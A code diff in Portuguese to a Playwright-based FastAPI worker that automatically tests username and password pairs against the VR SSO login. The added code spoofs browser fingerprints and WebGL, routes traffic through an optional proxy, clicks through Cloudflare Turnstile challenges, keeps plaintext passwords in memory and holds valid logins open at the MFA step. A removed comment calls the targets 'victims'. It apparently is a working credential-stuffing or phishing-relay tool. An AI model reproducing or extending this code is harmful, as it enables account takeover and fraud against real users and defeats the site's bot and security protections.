@@ -43,7 +43,10 @@ class WorkerState:
 
 state = WorkerState()
 active_sessions: dict[str, dict] = {}
-SESSION_TIMEOUT_SECONDS = 180
+pending_challenges: dict[str, dict] = {}
+SESSION_TIMEOUT_SECONDS = 300
+CHALLENGE_TIMEOUT_SECONDS = 180
+PROXY_URL = os.getenv("PROXY_URL", "").strip()
 
 async def obter_browser():
     """Garante que a instância do Chromium esteja conectada com auto-recovery."""
@@ -53,7 +56,7 @@ async def obter_browser():
     except Exception:
         pass
 
-    logger.info("[WARM WORKER] Conectando motor Chromium...")
+    logger.info("[WARM WORKER] Conectando motor Chromium com evasão stealth...")
     try:
         if state.playwright:
             try:
@@ -66,7 +69,10 @@ async def obter_browser():
             args=[
                 "--disable-blink-features=AutomationControlled",
                 "--no-sandbox",
-                "--disable-dev-shm-usage"
+                "--disable-dev-shm-usage",
+                "--disable-infobars",
+                "--window-size=1280,800",
+                "--lang=pt-BR,pt"
             ]
         )
         state.context = None
@@ -77,19 +83,116 @@ async def obter_browser():
     return state.browser
 
 async def criar_contexto_stealth():
-    """Cria contexto isolado com evasão de fingerprint e atributos reais de navegador."""
+    """Cria contexto isolado com evasão de fingerprint, spoofing de WebGL e atributos reais de navegador."""
     await obter_browser()
+    proxy_config = {"server": PROXY_URL} if PROXY_URL else None
     context = await state.browser.new_context(
         user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
         viewport={"width": 1280, "height": 800},
-        locale="pt-BR"
+        locale="pt-BR",
+        timezone_id="America/Sao_Paulo",
+        proxy=proxy_config
     )
     await context.add_init_script("""
-        Object.defineProperty(navigator, 'webdriver', {
-            get: () => undefined
-        });
+        // 1. Mascara flags de automação
+        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+        try { delete navigator.__proto__.webdriver; } catch (e) {}
+
+        // 2. Emula runtime real do Google Chrome
+        window.chrome = {
+            runtime: {
+                OnInstalledReason: {},
+                OnRestartRequiredReason: {},
+                PlatformArch: {},
+                PlatformNaclArch: {},
+                PlatformOs: {},
+                RequestUpdateCheckStatus: {}
+            },
+            loadTimes: function() {},
+            csi: function() {},
+            app: {}
+        };
+
+        // 3. Emula plugins e idiomas realistas
+        Object.defineProperty(navigator, 'languages', { get: () => ['pt-BR', 'pt', 'en-US', 'en'] });
+        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
+        Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
+        Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
+
+        // 4. WebGL Vendor & Renderer Spoofing (evita detecção de SwiftShader / Mesa de Datacenter)
+        try {
+            const getParam = WebGLRenderingContext.prototype.getParameter;
+            WebGLRenderingContext.prototype.getParameter = function(parameter) {
+                if (parameter === 37445) return 'Google Inc. (Intel)';
+                if (parameter === 37446) return 'ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)';
+                return getParam.apply(this, arguments);
+            };
+            if (window.WebGL2RenderingContext) {
+                const getParam2 = WebGL2RenderingContext.prototype.getParameter;
+                WebGL2RenderingContext.prototype.getParameter = function(parameter) {
+                    if (parameter === 37445) return 'Google Inc. (Intel)';
+                    if (parameter === 37446) return 'ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)';
+                    return getParam2.apply(this, arguments);
+                };
+            }
+        } catch (e) {}
+
+        // 5. Permissão de notificações mockada
+        if (navigator.permissions && navigator.permissions.query) {
+            const origQuery = navigator.permissions.query;
+            navigator.permissions.query = (parameters) => (
+                parameters.name === 'notifications' ?
+                    Promise.resolve({ state: Notification.permission }) :
+                    origQuery(parameters)
+            );
+        }
     """)
     return context
+
+async def tentar_resolver_turnstile(p: Page, timeout_seconds: float = 4.5) -> bool:
+    """Detecta a presença do Cloudflare Turnstile, interage com o checkbox e aguarda geração do token."""
+    logger.info("[WARM WORKER] Verificando e resolvendo desafio Cloudflare Turnstile...")
+    token_gerado = False
+    limite = int(timeout_seconds / 0.3)
+
+    for i in range(limite):
+        # 1. Verifica se o input oculto cf-turnstile-response já recebeu o token
+        try:
+            cf_input = p.locator('input[name="cf-turnstile-response"]').first
+            if await cf_input.count() > 0:
+                val = await cf_input.get_attribute("value")
+                if val and len(val.strip()) > 10:
+                    logger.info(f"[WARM WORKER] ✅ Token Turnstile confirmado ({len(val)} chars)!")
+                    return True
+        except Exception:
+            pass
+
+        # 2. Varre frames procurando o checkbox interativo do Turnstile
+        try:
+            for f in p.frames:
+                if "challenges.cloudflare.com" in f.url or "turnstile" in f.url:
+                    box = f.locator('input[type="checkbox"], .ctp-checkbox-label, #challenge-stage, .mark, body').first
+                    if await box.count() > 0 and await box.is_visible():
+                        logger.info("[WARM WORKER] Clicando no checkbox interativo do Cloudflare Turnstile...")
+                        await box.click(delay=40)
+                        await asyncio.sleep(0.4)
+                        break
+        except Exception:
+            pass
+
+        await asyncio.sleep(0.3)
+
+    # Verificação final do token
+    try:
+        cf_input = p.locator('input[name="cf-turnstile-response"]').first
+        if await cf_input.count() > 0:
+            val = await cf_input.get_attribute("value")
+            if val and len(val.strip()) > 10:
+                return True
+    except Exception:
+        pass
+
+    return False
 
 async def preparar_pagina():
     """Pré-carrega o formulário do SSO da VR com cookies e bundles em memória gerando state dinâmico."""
@@ -138,19 +241,21 @@ async def preparar_pagina():
         asyncio.create_task(preparar_pagina())
 
 async def limpar_sessoes_expiradas():
-    """Remove periodicamente sessões de MFA inativas que excederam o timeout de 180s."""
+    """Remove periodicamente sessões de MFA e desafios Turnstile inativos que excederam os limites."""
     while True:
         try:
             await asyncio.sleep(20)
             agora = asyncio.get_event_loop().time()
-            expirados = []
+
+            # 1. Limpa sessões de MFA expiradas (>300s)
+            expirados_mfa = []
             for k, sess in list(active_sessions.items()):
                 if agora - sess.get("created_at", 0) > SESSION_TIMEOUT_SECONDS:
-                    expirados.append(k)
-            for k in expirados:
+                    expirados_mfa.append(k)
+            for k in expirados_mfa:
                 sess = active_sessions.pop(k, None)
                 if sess:
-                    logger.info(f"[WARM WORKER] Limpando sessão MFA expirada (>180s): {k}")
+                    logger.info(f"[WARM WORKER] Limpando sessão MFA expirada (>300s): {k}")
                     try:
                         p = sess.get("page")
                         if p and not p.is_closed():
@@ -160,6 +265,26 @@ async def limpar_sessoes_expiradas():
                             await c.close()
                     except Exception:
                         pass
+
+            # 2. Limpa desafios Turnstile pendentes (>180s)
+            expirados_desafios = []
+            for k, sess in list(pending_challenges.items()):
+                if agora - sess.get("created_at", 0) > CHALLENGE_TIMEOUT_SECONDS:
+                    expirados_desafios.append(k)
+            for k in expirados_desafios:
+                sess = pending_challenges.pop(k, None)
+                if sess:
+                    logger.info(f"[WARM WORKER] Limpando contexto de desafio pendente (>180s): {k}")
+                    try:
+                        p = sess.get("page")
+                        if p and not p.is_closed():
+                            await p.close()
+                        c = sess.get("context")
+                        if c:
+                            await c.close()
+                    except Exception:
+                        pass
+
         except Exception as e:
             logger.error(f"[WARM WORKER] Erro no reaper de sessões: {e}")
 
@@ -182,6 +307,19 @@ async def shutdown_event():
         except Exception:
             pass
     active_sessions.clear()
+
+    for k, sess in list(pending_challenges.items()):
+        try:
+            p = sess.get("page")
+            if p and not p.is_closed():
+                await p.close()
+            c = sess.get("context")
+            if c:
+                await c.close()
+        except Exception:
+            pass
+    pending_challenges.clear()
+
     if state.page and not state.page.is_closed():
         await state.page.close()
     if state.context:
@@ -254,24 +392,12 @@ async def testar_credenciais(req: TesteRequest):
             await pass_input.fill("")
             await pass_input.type(senha, delay=30)
 
-            # Verifica se Turnstile está ativo ou gerando token antes de clicar
+            # 1.1 Pré-resolução ativa de Cloudflare Turnstile antes de submeter
             try:
-                cf_input = page.locator('input[name="cf-turnstile-response"]').first
-                if await cf_input.count() > 0:
-                    val = await cf_input.get_attribute("value")
-                    if not val:
-                        logger.info("[WARM WORKER] Aguardando token Turnstile ser gerado em segundo plano...")
-                        for _ in range(12): # até 1.8s
-                            await asyncio.sleep(0.15)
-                            val = await cf_input.get_attribute("value")
-                            if val:
-                                logger.info("[WARM WORKER] Token Turnstile obtido com sucesso!")
-                                break
-                else:
-                    # Pausa natural anti-automação (400ms) para scripts de segurança completarem setup
-                    await asyncio.sleep(0.4)
+                await tentar_resolver_turnstile(page, timeout_seconds=4.0)
+                await asyncio.sleep(0.3)
             except Exception:
-                await asyncio.sleep(0.4)
+                pass
 
             btn = page.locator(SELECTOR_CONTINUAR).first
             if await btn.count() > 0:
@@ -310,10 +436,18 @@ async def testar_credenciais(req: TesteRequest):
 
                                 # Erro 600010: falha de carregamento do desafio Turnstile
                                 if "600010" in full_err or "desafio de segurança" in full_err or "turnstile" in full_err or "captcha" in full_err:
+                                    logger.info("[WARM WORKER] 🛡️ Desafio Turnstile detectado no DOM. Tentando resolver...")
+                                    turnstile_detectado = True
+                                    resolvido = await tentar_resolver_turnstile(page, timeout_seconds=3.5)
+                                    if resolvido:
+                                        btn_retry = page.locator(SELECTOR_CONTINUAR).first
+                                        if await btn_retry.count() > 0:
+                                            await btn_retry.click()
+                                            await asyncio.sleep(0.8)
+                                            continue
                                     resultado_valido = False
                                     status_credencial = "bloqueio_captcha"
                                     msg_resultado = f"Desafio de segurança da VR pendente (Código: {txt or err_code})"
-                                    turnstile_detectado = True
                                     break
                                 elif any(k in full_err for k in ["incorret", "inválid", "invalido", "senha", "não encontramos", "verifique seus dados", "credenciais", "password"]):
                                     resultado_valido = False
@@ -325,8 +459,8 @@ async def testar_credenciais(req: TesteRequest):
                                     status_credencial = "invalido"
                                     msg_resultado = f"Erro reportado pela VR: {txt}"
                                     break
-                    if resultado_valido is False:
-                        break
+                        if resultado_valido is False:
+                            break
                 except Exception:
                     pass
 
@@ -379,12 +513,24 @@ async def testar_credenciais(req: TesteRequest):
                     "usuario": usuario,
                     "created_at": asyncio.get_event_loop().time()
                 }
-                # Desconecta do WorkerState para que a próxima vítima ganhe uma nova aba limpa
+                state.page = None
+                state.context = None
+                asyncio.create_task(preparar_pagina())
+            elif status_credencial == "bloqueio_captcha":
+                # Preserva o contexto e aba aberta para tentativa posterior sem recarregar tudo
+                logger.info(f"[WARM WORKER] 🛡️ Preservando aba com desafio Turnstile para {usuario} em pending_challenges...")
+                pending_challenges[user_key] = {
+                    "page": page,
+                    "context": state.context,
+                    "usuario": usuario,
+                    "senha": senha,
+                    "created_at": asyncio.get_event_loop().time()
+                }
                 state.page = None
                 state.context = None
                 asyncio.create_task(preparar_pagina())
             else:
-                # Recicla a aba normalmente em caso de senha inválida ou captcha
+                # Recicla a aba normalmente em caso de senha inválida
                 asyncio.create_task(preparar_pagina())
 
             return {
@@ -408,6 +554,100 @@ async def testar_credenciais(req: TesteRequest):
                 "status_credencial": "invalido",
                 "mensagem": f"Erro interno no worker: {err}"
             }
+
+@app.post("/retestar")
+async def retestar_sso(req: TesteRequest):
+    """Re-executa a tentativa de login aproveitando o contexto de desafio existente ou criando nova aba."""
+    usuario = req.usuario.strip()
+    user_key = usuario.lower()
+    senha = req.senha
+
+    sess_pendente = pending_challenges.pop(user_key, None)
+    if sess_pendente and sess_pendente.get("page") and not sess_pendente["page"].is_closed():
+        p: Page = sess_pendente["page"]
+        ctx: Optional[BrowserContext] = sess_pendente.get("context")
+        logger.info(f"[WARM WORKER] Re-testando desafio em aba viva para {usuario}...")
+        try:
+            ok = await tentar_resolver_turnstile(p, timeout_seconds=5.0)
+            btn = p.locator(SELECTOR_CONTINUAR).first
+            if await btn.count() > 0:
+                await btn.click()
+            else:
+                await p.keyboard.press("Enter")
+
+            for _ in range(20):
+                await asyncio.sleep(0.3)
+                url_atual = p.url
+                if "mfa-email-challenge" in url_atual or "mfa" in url_atual.lower():
+                    logger.info(f"[WARM WORKER] 🎉 Desafio vencido na re-tentativa para {usuario}! Promovendo para active_sessions...")
+                    active_sessions[user_key] = {
+                        "page": p,
+                        "context": ctx,
+                        "usuario": usuario,
+                        "created_at": asyncio.get_event_loop().time()
+                    }
+                    salvar_resultado_local(usuario, senha, True, "Login válido após re-tentativa - MFA encontrado", url_atual, "valido")
+                    return {
+                        "success": True,
+                        "usuario": usuario,
+                        "valido": True,
+                        "status_credencial": "valido",
+                        "mfa_ativo": True,
+                        "mensagem": "Desafio resolvido com sucesso! Etapa MFA pronta.",
+                        "url_final": url_atual
+                    }
+
+            # Se ainda persistir em desafio
+            pending_challenges[user_key] = sess_pendente
+            return {
+                "success": True,
+                "usuario": usuario,
+                "valido": False,
+                "status_credencial": "bloqueio_captcha",
+                "mfa_ativo": False,
+                "mensagem": "Desafio Cloudflare Turnstile ainda pendente na VR."
+            }
+        except Exception as re_err:
+            logger.warning(f"[WARM WORKER] Falha na aba pendente ({re_err}). Descartando e iniciando teste normal...")
+            try:
+                await p.close()
+                if ctx:
+                    await ctx.close()
+            except Exception:
+                pass
+
+    return await testar_credenciais(req)
+
+@app.post("/limpar-memoria")
+async def limpar_memoria():
+    """Fecha todas as abas e contextos ativos e pendentes para garantir Zero Test Pollution."""
+    logger.info("[WARM WORKER] Limpando todas as sessões e desafios em memória...")
+    for k, sess in list(active_sessions.items()):
+        try:
+            p = sess.get("page")
+            if p and not p.is_closed():
+                await p.close()
+            c = sess.get("context")
+            if c:
+                await c.close()
+        except Exception:
+            pass
+    active_sessions.clear()
+
+    for k, sess in list(pending_challenges.items()):
+        try:
+            p = sess.get("page")
+            if p and not p.is_closed():
+                await p.close()
+            c = sess.get("context")
+            if c:
+                await c.close()
+        except Exception:
+            pass
+    pending_challenges.clear()
+
+    asyncio.create_task(preparar_pagina())
+    return {"success": True, "mensagem": "Memória e contextos purgados com sucesso."}
 
 @app.get("/sessoes")
 async def listar_sessoes():
